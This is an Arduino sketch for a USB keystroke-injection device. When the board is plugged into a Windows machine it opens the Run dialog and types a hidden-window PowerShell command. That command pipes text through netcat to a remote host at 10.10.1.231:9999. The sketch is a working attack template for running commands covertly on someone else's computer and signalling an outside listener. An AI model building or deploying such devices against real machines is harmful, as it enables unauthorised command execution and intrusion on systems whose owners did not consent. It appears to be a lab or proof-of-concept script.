#include <Keyboard.h>

void setup()
{
    Serial.begin(9600);

    // Simulate pressing the Windows key (left GUI key) and 'r' key
    Keyboard.press(KEY_LEFT_GUI);
    delay(50);
    Keyboard.press('r');
    delay(50);
    
    // Release the keys
    Keyboard.release(KEY_LEFT_GUI);
    Keyboard.release('r');
    delay(50);

    // Send the command to execute PowerShell with a hidden window and run a specific command
    Keyboard.println("powershell.exe -WindowStyle hidden -command \"&{&\" echo \"create\" | nc 10.10.1.231 9999 -w 1\"}\";");
    delay(50);

    // Simulate pressing and releasing the Enter key
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);

    // End the keyboard simulation
    Keyboard.end();
}

void loop()
{
    // The loop function is empty as there is no need for continuous execution
}
